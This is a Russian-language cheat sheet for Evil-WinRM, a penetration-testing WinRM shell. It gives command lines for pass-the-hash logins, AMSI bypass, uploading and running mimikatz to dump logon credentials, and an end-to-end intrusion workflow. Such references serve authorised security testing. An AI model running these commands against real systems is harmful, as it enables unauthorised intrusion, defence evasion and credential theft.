<a id="-evil-winrm---windows-remote-shell"></a>
# 😈 Evil-WinRM — удалённая оболочка Windows

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Русская главная](../../README.ru.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 The Ultimate WinRM Shell
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Evil-WinRM](#-what-is-evil-winrm)
- [Установка](#-installation)
- [Основы подключения](#-basic-connection)
- [Работа с файлами](#-file-operations)
- [Встроенные команды](#-built-in-commands)
- [Pass-the-Hash — аутентификация с использованием хеша](#-pass-the-hash)
- [Аутентификация Kerberos](#-kerberos-auth)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-evil-winrm"></a>
## 🎯 Что такое Evil-WinRM

**Evil-WinRM** — оболочка WinRM с возможностями для тестирования безопасности:

- 🖥️ **Интерактивная оболочка** — полноценный сеанс PowerShell
- 📁 **Передача файлов** — загрузка и скачивание
- 🔓 **Pass-the-Hash** — аутентификация с использованием хеша NTLM
- 🎫 **Kerberos** — аутентификация по билетам
- 🧩 **Модули** — загрузка скриптов PowerShell

<a id="winrm-ports"></a>
### Порты WinRM

> **Контекст:** доступ требует включённого WinRM и разрешений на удалённый сеанс. HTTP сам по себе не означает открытый текст: NTLM/Kerberos могут шифровать сообщения после аутентификации. См. [безопасность WinRM](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security).

| Порт | Протокол | Примечания |
|------|----------|-------|
| 5985 | HTTP | По умолчанию |
| 5986 | HTTPS | С шифрованием |

---

<a id="-installation"></a>
## 🚀 Установка

<a id="kali-linux"></a>
### Kali Linux

```bash
# Установка
sudo apt update
sudo apt install evil-winrm

# Или через gem
sudo gem install evil-winrm
```

<a id="from-github"></a>
### Из GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

<a id="-basic-connection"></a>
## 💻 Основы подключения

<a id="password-authentication"></a>
### Аутентификация по паролю

> **Совместимость:** в текущем парсере нет параметра `-d`; строки оригинала сохранены. `-P` меняет порт, но сам по себе не включает HTTPS. См. [исходный парсер](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb).

```bash
# Обычное подключение
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Указать домен
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (порт 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Указать порт
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

<a id="ssl-options"></a>
### Параметры SSL

> **Сертификаты:** текущий клиент использует отключённую проверку сертификата сервера. `-c`/`-k` задают клиентские сертификат и ключ; для такой аутентификации нужны настройки и сопоставление учётной записи на сервере. См. [исходный код](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb) и [Microsoft](https://learn.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections#client-certificate-based-authentication).

```bash
# SSL без проверки сертификата
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# С сертификатом
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

<a id="-file-operations"></a>
## 📁 Работа с файлами

<a id="upload-files"></a>
### Загрузка файлов на удалённый узел

```bash
# В оболочке Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Загрузить в указанное расположение
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Из командной строки (с -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

<a id="download-files"></a>
### Скачивание файлов

```bash
# Скачать файл
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Скачать в указанное расположение
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

<a id="executable-directory"></a>
### Каталог исполняемых файлов

> **Уточнение:** `-e` задаёт локальный каталог исполняемых сборок для функций загрузки, а не автоматически передаёт файлы. Файл для `upload` разрешается по локальному пути. См. [документацию проекта](https://github.com/Hackplayers/evil-winrm#documentation).

```bash
# Указать каталог exe для загрузки
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# В оболочке загрузить любой exe из этого каталога
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="-built-in-commands"></a>
## 🛠️ Встроенные команды

<a id="menu"></a>
### Меню

```bash
# Показать все команды
*Evil-WinRM* PS C:\> menu

# Доступные команды:
Bypass-4MSI       - Обойти AMSI
Dll-Loader        - Загрузить DLL в память
Donut-Loader      - Загрузить сборку .NET
Invoke-Binary     - Выполнить исполняемый файл
services          - Перечислить службы
upload            - Загрузить файл
download          - Скачать файл
```

<a id="amsi-bypass"></a>
### Обход AMSI

> **Ограничение:** AMSI — интерфейс проверки содержимого, а не весь антивирус. Исходное утверждение о запуске обнаруживаемых инструментов не гарантирует обход защиты; поведение зависит от среды и версии. См. [описание AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal).

```bash
# Обойти AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Теперь можно запускать инструменты, обнаруживаемые антивирусом (AV)
```

<a id="load-scripts"></a>
### Загрузка скриптов

```bash
# Подключиться с каталогом скриптов
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# В оболочке загрузить скрипт
*Evil-WinRM* PS C:\> PowerView.ps1

# Использовать функции скрипта
*Evil-WinRM* PS C:\> Get-DomainUser
```

<a id="execute-binaries"></a>
### Выполнение исполняемых файлов

> **Формат:** Invoke-Binary предназначен для сборок .NET, а не любого EXE. Обычный нативный mimikatz.exe не является такой сборкой; примеры сохранены. Функции загрузки доступны после menu. См. [Advanced commands](https://github.com/Hackplayers/evil-winrm#advanced-commands).

```bash
# Задать каталог исполняемых файлов
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Выполнить исполняемый файл в памяти
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# С аргументами
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

<a id="dll-loading"></a>
### Загрузка DLL

> **Неполный пример:** в документированном синтаксисе Dll-Loader требуется также выбор способа загрузки; один `-path` его не задаёт. См. [документацию проекта](https://github.com/Hackplayers/evil-winrm#advanced-commands).

```bash
# Загрузить DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

<a id="services"></a>
### Службы

```bash
# Перечислить службы
*Evil-WinRM* PS C:\> services
```

---

<a id="-pass-the-hash"></a>
## 🔓 Pass-the-Hash — аутентификация с использованием хеша

<a id="ntlm-hash"></a>
### Хеш NTLM

> **Формат хеша:** текущий `-H` принимает только NT-хеш — 32 шестнадцатеричных символа. Первый пример с LM:NTLM не проходит эту проверку; буквальная строка сохранена. См. [парсер](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb).

```bash
# Подключиться с хешем
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Только часть NTLM
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# С доменом
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

<a id="-kerberos-auth"></a>
## 🎫 Аутентификация Kerberos

<a id="setup"></a>
### Подготовка

```bash
# Указать кеш билетов в KRB5CCNAME
export KRB5CCNAME=/path/to/ticket.ccache

# Настроить realm в /etc/krb5.conf
```

<a id="connect-with-kerberos"></a>
### Подключение с Kerberos

> **Предпосылки:** нужны действующий билет, корректные realm/KDC и имя узла, соответствующее сервису; переменная KRB5CCNAME сама не получает билет. Синтаксис и поддержка кешей зависят от версии. См. [справку Evil-WinRM](https://github.com/Hackplayers/evil-winrm#help).

```bash
# Аутентификация Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# С указанным ccache
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="connection-options"></a>
### Параметры подключения

| Параметр | Описание |
|--------|-------------|
| `-i` | IP-адрес или имя целевого узла |
| `-u` | Имя пользователя |
| `-p` | Пароль |
| `-H` | Хеш NTLM |
| `-d` | Домен |
| `-S` | Использовать SSL (HTTPS) |
| `-P` | Порт |
| `-r` | Realm Kerberos — область аутентификации |

<a id="file-options"></a>
### Параметры файлов

| Параметр | Описание |
|--------|-------------|
| `-s` | Каталог скриптов |
| `-e` | Каталог исполняемых файлов |
| `-c` | Сертификат SSL |
| `-k` | Ключ SSL |

<a id="shell-commands"></a>
### Команды оболочки

| Команда | Описание |
|---------|-------------|
| `upload` | Загрузить файл на удалённый узел |
| `download` | Скачать файл |
| `menu` | Показать команды |
| `Bypass-4MSI` | Обойти AMSI |
| `Invoke-Binary` | Выполнить exe в памяти |
| `services` | Перечислить службы |
| `Dll-Loader` | Загрузить DLL |

<a id="common-workflow"></a>
### Типичная последовательность работы

```bash
# 1. Подключиться
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Обойти AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Загрузить инструменты
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Выполнить
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Скачать результаты
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Документация WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [CrackMapExec](../../CrackMapExec/translations/README.ru.md)
- [Impacket](../../Impacket/translations/README.ru.md)
- [Mimikatz](../../Mimikatz/translations/README.ru.md)

---

<p align="center">
  <b>😈 Мощная оболочка WinRM!</b><br>
  <i>Evil-WinRM — уверенное тестирование Windows</i>
</p>
